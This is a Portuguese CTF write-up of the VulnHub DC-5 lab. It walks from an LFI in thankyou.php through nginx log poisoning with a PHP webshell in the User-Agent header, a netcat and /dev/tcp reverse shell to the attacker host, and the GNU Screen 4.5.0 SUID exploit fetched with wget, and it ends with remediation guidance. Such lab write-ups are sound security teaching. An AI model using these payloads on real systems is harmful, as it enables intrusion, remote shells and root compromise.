# DC: 5 — Quando o Ano de Copyright Vira Vetor de Ataque

Se você já ignorou um ano de copyright que muda dinamicamente no rodapé de uma página como simples bug de template, o DC: 5 vai curar esse hábito de uma vez por todas. Aquele valor que alterna entre 2019 e 2020 no `thankyou.php` é o sinal de que existe uma vulnerabilidade de inclusão de arquivo, e a partir daí o caminho vai direto até root via log poisoning e um binário SUID que o GNU Screen lamentou ter distribuído. Mano, é uma das progressões LFI-para-root mais satisfatórias de toda a série DC.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | DC-5 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/dc-5,314/ |
| **Técnicas** | Descoberta de hosts, reconhecimento Nmap, LFI, envenenamento de log nginx, RCE via PHP, escalação SUID |
| **CVEs** | CVE-2017-5618 (GNU Screen 4.5.0 SUID root local) |
| **CWEs** | CWE-22 (Path Traversal / LFI), CWE-284 (Controle de Acesso Impróprio) |
| **Grupos APT** | APT41 (cadeias LFI em apps web expostos), FIN7 (persistência via log e RCE) |

---

## Resumo do Ataque

```
[netdiscover] → [nmap: porta 80 nginx]
    → [navegação: formulário de contato → thankyou.php]
    → [ano de copyright rotativo → ?file= LFI descoberto]
    → [LFI: /etc/passwd confirmado]
    → [LFI: /var/log/nginx/access.log lido com sucesso]
    → [Burp: User-Agent → <?php system($_GET['cmd']); ?> injetado no log]
    → [LFI + &cmd=id → RCE como www-data confirmado]
    → [listener nc + cmd=nc shell reversa → shell estabelecida]
    → [find SUID: /bin/screen-4.5.0 → CVE-2017-5618 / EDB-41154]
    → [compilar libhax.so + rootshell no atacante → wget para /tmp]
    → [./41154.sh → uid=0(root)]
    → [cat /root/thisistheflag.txt → FLAG]
```

---

## Metodologia

1. Descoberta de hosts na rede e enumeração de portas com Nmap.
2. Análise da aplicação web: formulário de contato, resposta de envio e descoberta de parâmetro de inclusão dinâmica.
3. Confirmação de LFI via path traversal no parâmetro `file`.
4. Log poisoning: injetar webshell PHP no log de acesso do nginx via cabeçalho User-Agent.
5. Execução remota de código via LFI + inclusão de log e parâmetro `cmd`.
6. Entrega de shell reversa e upgrade para TTY.
7. Enumeração de SUID; identificação do screen 4.5.0 (CVE-2017-5618).
8. Compilação, transferência e execução do exploit para root.

---

## Passo 1 — Descobrindo o Alvo na Rede

Antes de tocar em qualquer coisa, precisamos saber com quem estamos falando. Em ambiente de lab local, o `netdiscover` é a forma mais rápida de varrer uma sub-rede e encontrar uma VM recém-inicializada.

**Por que netdiscover?** Ele funciona na camada 2 (ARP), o que significa que encontra hosts que podem filtrar ICMP. VMs em adaptadores host-only ou bridged sempre respondem a ARP.

```bash
# -r especifica o range da sub-rede
netdiscover -r 192.168.1.0/24
```

Output esperado (trecho relevante):

```
 192.168.1.108   00:0c:29:xx:xx:xx    1    60   VMware, Inc.
```

Alvo confirmado em `192.168.1.108`. Você pode também usar `arp-scan --localnet` ou `nmap -sn 192.168.1.0/24` se preferir.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração de Portas e Fingerprinting de Serviços

Com o IP em mãos, rodamos um scan agressivo completo. A flag `-A` habilita detecção de SO, versão, scripts e traceroute em uma única passagem.

```bash
# -A: modo agressivo (SO, versão, scripts, traceroute)
nmap -A 192.168.1.108
```

Output esperado (seção principal):

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.6.2
| http-title: Welcome
|_http-server-header: nginx/1.6.2
```

Apenas a porta 80 está aberta. É um servidor nginx, o que importa mais adiante para o log poisoning, pois nginx e Apache gravam logs em caminhos diferentes. Anote isso.

**MITRE ATT&CK:** T1592 — Coleta de Informações do Host Alvo

---

## Passo 3 — Reconhecimento Web: Encontrando o Sinal de LFI

Acesse `http://192.168.1.108`. Há um site com barra de navegação e um formulário de contato em `/contact.php`. Envie o formulário com dados quaisquer. O servidor retorna uma página de agradecimento em:

```
http://192.168.1.108/thankyou.php
```

Aqui fica interessante: aperte **F5** algumas vezes. O ano de copyright no rodapé alterna entre 2019 e 2020. Isso não é animação CSS. Significa que o ano está sendo puxado de um arquivo externo a cada requisição, que é a assinatura clássica de uma vulnerabilidade de inclusão de arquivo.

A URL ainda não mostra o parâmetro, mas inspecionar o fonte ou usar o Burp para interceptar a resposta revela um parâmetro `file`. Teste adicionando manualmente:

```
http://192.168.1.108/thankyou.php?file=footer2.php
```

O conteúdo do rodapé muda. O parâmetro é `file` e o servidor inclui arquivos baseado na entrada do usuário sem nenhuma sanitização.

**Nota real:** Vulnerabilidades LFI estão consistentemente no OWASP Top 10 sob A03 (Injeção). Em 2021, atores de ameaça exploraram LFI no Pulse Secure VPN (CVE-2021-22893) para contornar autenticação e implantar webshells em redes corporativas antes de qualquer patch disponível. Mesma primitiva, escala diferente.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública

---

## Passo 4 — Confirmação do LFI e Descoberta do Caminho do Log

Hora de provar o LFI e enumerar acessibilidade de arquivos de log. Testamos com `/etc/passwd` primeiro porque é sempre legível e tem assinatura de saída reconhecível.

```bash
# Teste clássico de traversal LFI — ajuste a profundidade (../) conforme a document root
curl "http://192.168.1.108/thankyou.php?file=../../../../../etc/passwd"
```

Output esperado (trecho):

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

LFI confirmado. •̀ᴗ•́

Agora verificamos o caminho do log de acesso do nginx. O padrão no Debian/Ubuntu é `/var/log/nginx/access.log`. Vamos checar:

```bash
curl "http://192.168.1.108/thankyou.php?file=../../../../../var/log/nginx/access.log"
```

O conteúdo do log aparece no browser, mostrando requisições HTTP no formato combined log do nginx. O processo web (`www-data`) tem acesso de leitura ao log. Essa é a segunda peça do quebra-cabeça.

**Alternativas:** Se os logs do nginx não fossem legíveis, outros alvos incluem `/var/log/apache2/access.log` (Apache), `/proc/self/environ` (injeção via ambiente do processo), ou `/var/mail/www-data` (injeção via log de email). A técnica é a mesma: encontrar um arquivo que registra input controlado pelo atacante e é legível via LFI.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 5 — Log Poisoning: Armando os Logs de Acesso do nginx

Aqui as coisas ficam sinistras. ԅ(≖‿≖ԅ) O log de acesso do nginx registra o cabeçalho `User-Agent` de cada requisição. Se injetarmos código PHP nesse cabeçalho e o LFI incluir o arquivo de log depois, o interpretador PHP vai executar nosso payload.

Use o Burp Suite (ou curl) para enviar uma requisição com webshell PHP no User-Agent:

**No Burp Suite:**
1. Intercepte qualquer requisição GET para `http://192.168.1.108/`.
2. Na aba Proxy, modifique o cabeçalho `User-Agent` para:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

3. Encaminhe a requisição.

**Via curl (alternativa):**

```bash
# -A define a string do User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.1.108/
```

O payload PHP agora está gravado literalmente em `/var/log/nginx/access.log`. Cada linha do log que contém nossa entrada no `User-Agent` agora carrega código PHP executável, esperando ser acionado.

**Por que funciona?** O nginx não sanitiza entradas de log. O arquivo de log é texto puro. Quando o interpretador PHP processa o log via LFI, ele executa qualquer tag PHP que encontrar. O arquivo efetivamente vira um webshell.

**Nota real:** Log poisoning foi documentado em campo em intrusões do APT41 contra servidores Apache (2019-2020) onde atacantes injetavam backdoors PHP em logs de acesso após obter LFI via frameworks web vulneráveis. FIN7 também usou persistência similar baseada em log para manter acesso após exploração web inicial.

**MITRE ATT&CK:** T1505.003 — Componente de Software Servidor: Web Shell

---

## Passo 6 — Execução Remota de Código via Inclusão de Log

Agora incluímos o log envenenado via LFI e passamos um comando pelo parâmetro `cmd`. O webshell PHP no log vai executar `system($_GET['cmd'])`.

```bash
# Confirmar RCE com 'id'
curl "http://192.168.1.108/thankyou.php?file=../../../../../var/log/nginx/access.log&cmd=id"
```

Output esperado (embutido no conteúdo do log):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

( ͡° ͜ʖ ͡°) Temos RCE como `www-data`. Momento de genialidade total, véi.

**Dica profissional:** Se o log crescer muito e o output ficar difícil de ler, faça pipe para `grep` no lado do atacante ou use `curl -s ... | grep -oP 'uid=.*'` para extrair apenas o output do comando.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos e Scripts: Shell Unix

---

## Passo 7 — Shell Reversa e Upgrade para TTY

RCE via parâmetro GET funciona mas é frágil. Queremos um shell interativo adequado. Inicie um listener e entregue uma shell reversa pelo parâmetro `cmd`.

**Passo 7a — Iniciar o listener na máquina atacante:**

```bash
nc -lvnp 1234
```

**Passo 7b — Entregar o payload da shell reversa (URL-encoded):**

```bash
# Payload: nc -e /bin/bash <ip_atacante> <porta>
# URL-encode espaços e caracteres especiais para entrega via GET
curl "http://192.168.1.108/thankyou.php?file=../../../../../var/log/nginx/access.log&cmd=nc%20-e%20/bin/bash%20192.168.1.110%201234"
```

Shell cai no listener: ᕕ( ᐛ )ᕗ

**Passo 7c — Upgrade para TTY adequado:**

```bash
# Spawn PTY usando Python (Python 2 em Debian mais antigo)
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Agora você é `www-data` no DC-5 com shell estável.

**Alternativas para o payload:**
- `bash -c 'bash -i >& /dev/tcp/192.168.1.110/1234 0>&1'` (redirecionamento TCP Bash)
- `python -c 'import socket,os,pty; ...'` (shell Python)
- one-liner mkfifo (funciona quando `nc -e` não está disponível)

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos e Scripts: Shell Unix

---

## Passo 8 — Enumeração de SUID: Encontrando o screen 4.5.0

Com pé dentro como `www-data`, precisamos de um caminho para root. A primeira verificação padrão são binários SUID. SUID (Set User ID) significa que o binário roda como seu proprietário (geralmente root) independente de quem o executa. Um binário SUID vulnerável é um vetor direto de escalação para root.

```bash
# find: buscar desde root, -perm -u=s: bit SUID setado, -type f: apenas arquivos
# 2>/dev/null: suprimir erros de permissão em diretórios não acessíveis
find / -perm -u=s -type f 2>/dev/null
```

Output esperado (entrada relevante):

```
/bin/screen-4.5.0
```

ಠᴗಠ Lá está. `/bin/screen-4.5.0` — uma versão específica do GNU Screen instalada com o bit SUID intacto. Screen 4.5.0 é vulnerável a uma escalação local de privilégios documentada no CVE-2017-5618 e entrada EDB-41154 do Exploit-DB. A vulnerabilidade abusa de um recurso de `logfile` para escrever em arquivos arbitrários como root, combinado com `LD_PRELOAD` via `ld.so.preload`.

**MITRE ATT&CK:** T1548.001 — Abuso de Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Passo 9 — Escalação de Privilégios via CVE-2017-5618 (EDB-41154)

O exploit consiste em dois programas C que devem ser compilados na máquina atacante e transferidos para o alvo.

**Passo 9a — Na máquina atacante, obter e preparar o exploit:**

```bash
searchsploit screen 4.5.0
searchsploit -m 41154
```

**Passo 9b — Compilar ambos na máquina atacante:**

```bash
# -fPIC: código independente de posição para biblioteca compartilhada
gcc -fPIC -shared -ldl -o libhax.so libhax.c

# Compilação padrão do binário
gcc -o rootshell rootshell.c
```

**Passo 9c — Servir e transferir para o alvo:**

```bash
# No atacante: iniciar servidor web no diretório do exploit
python -m SimpleHTTPServer 8000     # Python 2
# python3 -m http.server 8000       # Python 3 (alternativa)
```

No alvo (via shell reversa):

```bash
cd /tmp
wget http://192.168.1.110:8000/41154.sh
wget http://192.168.1.110:8000/libhax.so
wget http://192.168.1.110:8000/rootshell
chmod +x 41154.sh
./41154.sh
id
```

Output esperado:

```
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Dropping suid shell in /tmp...
[+] done!
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

(☞ﾟヮﾟ)☞ Shell root. GG, rapaziada.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Passo 10 — Flag do Root

```bash
cd /root
ls -la
cat thisistheflag.txt
```

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado/Quebrado |
|---|---|---|---|
| Flag root | (conteúdo de `/root/thisistheflag.txt`) | `/root/thisistheflag.txt` | Lida diretamente como root |
| Usuário processo web | `www-data` | LFI + log poisoning RCE | Usado para shell inicial |
| Binário SUID | `/bin/screen-4.5.0` | Enumeração SUID | Explorado via CVE-2017-5618 |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Ano de copyright rotativo revelou inclusão dinâmica de arquivo | Qualquer conteúdo dinâmico buscado por requisição é candidato a teste de LFI | Nunca passar input controlado pelo usuário diretamente para funções de inclusão de arquivo |
| 2 | Log de acesso do nginx legível pelo processo web | Log poisoning é possível em qualquer servidor onde logs são world-readable ou legíveis pelo processo web | Restringir permissões de log: `root:adm 640` no mínimo |
| 3 | Webshell PHP injetado via cabeçalho User-Agent | APT41 e FIN7 usaram injeção via cabeçalho HTTP para plantar backdoors em logs | Monitorar tags PHP em cabeçalhos HTTP via WAF ou regras IDS |
| 4 | Bit SUID em screen 4.5.0 (CVE-2017-5618) | Binários SUID antigos em servidores de produção são risco persistente de root | Auditar binários SUID/GUID trimestralmente; remover SUID de binários que não precisam |
| 5 | Nenhuma sanitização no parâmetro `file` | Inclusão de arquivo sem validação é categoria top-10 de vulnerabilidade web | Whitelist de valores permitidos; nunca construir caminhos de arquivo a partir de input bruto |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Coleta de Informações do Host | T1592 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Persistência | Persistência | Componente de Software Servidor: Web Shell | T1505.003 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Movimento Lateral | Movimento Lateral | Transferência de Ferramenta de Entrada | T1105 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Setuid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover o parâmetro `file`** do `thankyou.php`. Se conteúdo dinâmico for necessário, usar um mapa server-side (array indexado por ID inteiro) e nunca aceitar nomes de arquivo do usuário.
2. **Restringir permissões do log nginx** para `root:adm 640`. O usuário `www-data` não deve conseguir ler os logs de acesso.
3. **Remover o bit SUID do screen:** `chmod u-s /bin/screen-4.5.0`. Atualizar para versão patcheada do screen se multiplexação de terminal for necessária.
4. **Implementar validação de input** em todos os parâmetros de query string: rejeitar separadores de caminho (`../`, `/`), bytes nulos e qualquer input que corresponda a padrão de caminho de arquivo.
5. **Implantar regra WAF** para bloquear tags PHP (`<?php`) em User-Agent, Referer e outros cabeçalhos HTTP registrados.
6. **Auditar todos os binários SUID/GUID** periodicamente: `find / -perm /6000 -type f 2>/dev/null` e cruzar com bancos de dados de CVE.

### NIST CSF 2.0

| Função | Ação |
|---|---|
| Identificar | Inventariar todos os binários SUID e vetores de input da aplicação web; classificar sensibilidade dos arquivos de log |
| Proteger | Aplicar menor privilégio nas ACLs de log; desabilitar inclusão de arquivo controlada pelo usuário; patchear binários SUID |
| Detectar | Alertar sobre tags PHP em logs de requisição HTTP; monitorar execuções de binários SUID via auditd |
| Responder | Isolar o servidor web; revogar inclusão de arquivo exposta; rotacionar credenciais |
| Recuperar | Restaurar configuração limpa da app web; patchear screen; re-auditar binários SUID |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicabilidade |
|---|---|---|
| SI-10 | Validação de Input | Validar parâmetro `file` contra whitelist estrita |
| SI-3 | Proteção contra Código Malicioso | Implantar WAF para bloquear injeção de tags PHP em cabeçalhos |
| AC-6 | Menor Privilégio | Processo web não deve ler arquivos de log; bits SUID auditados |
| CM-7 | Menor Funcionalidade | Remover SUID do screen; desabilitar funcionalidades PHP não utilizadas |
| AU-2 | Log de Eventos | Registrar anomalias em cabeçalhos HTTP; detectar PHP no User-Agent |
| SC-7 | Proteção de Fronteira | Segmentar servidor web na rede; restringir conexões de saída |

### CISA KEV

CVE-2017-5618 (GNU Screen 4.5.0 escalação local de privilégios via SUID) não está atualmente listado no catálogo CISA KEV (é exploit apenas local). Porém, a cadeia LFI + log poisoning que permite acesso inicial foi explorada em campanhas rastreadas pela CISA. Organizações devem tratar qualquer LFI não autenticado em aplicação exposta à internet como severidade KEV.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Vulnerabilidades (VM) | Identificar e remediar vulnerabilidades SUID | MIL2 |
| Gestão de Configuração (CM) | Restringir permissões de log; desabilitar inclusão dinâmica de arquivo | MIL2 |
| Consciência Situacional (SA) | Monitorar logs web para padrões de injeção | MIL3 |

### MITRE D3FEND

- **D3-HBPI** (Isolamento de Processo Baseado em Hardware): isolar processos do servidor web.
- **D3-UAP** (Permissões de Conta de Usuário): aplicar menor privilégio em contas de processo web.
- **D3-SFA** (Análise de Funcionalidade de Software): auditar módulos PHP habilitados e binários SUID.

---

## Considerações Finais

DC: 5 demonstra de forma sólida que as vulnerabilidades de maior impacto são frequentemente as mais simples: um ano de copyright rotativo vaza a existência do LFI, um arquivo de log world-readable vira mecanismo de entrega de webshell, e um binário SUID esquecido de 2017 entrega o root. Sem frameworks sofisticados, sem zero-days: só enumeração clara e seguir cada pista até a conclusão lógica.

Grande respeito ao **DCAU7** por criar uma máquina que recompensa paciência e reconhecimento web minucioso em vez de ferramentas de força bruta. O caminho do log poisoning em particular é uma jogada genial para ensinar por que cabeçalhos HTTP são superfície de ataque e por que permissões de log importam além de checklists de compliance.

Se esse writeup te ajudou a evoluir, compartilha com a galera e continua avançando na série DC. Cada uma tem seu próprio estilo de "pensa fora da caixa."

Thanks guys!! (❍ᴥ❍ʋ)
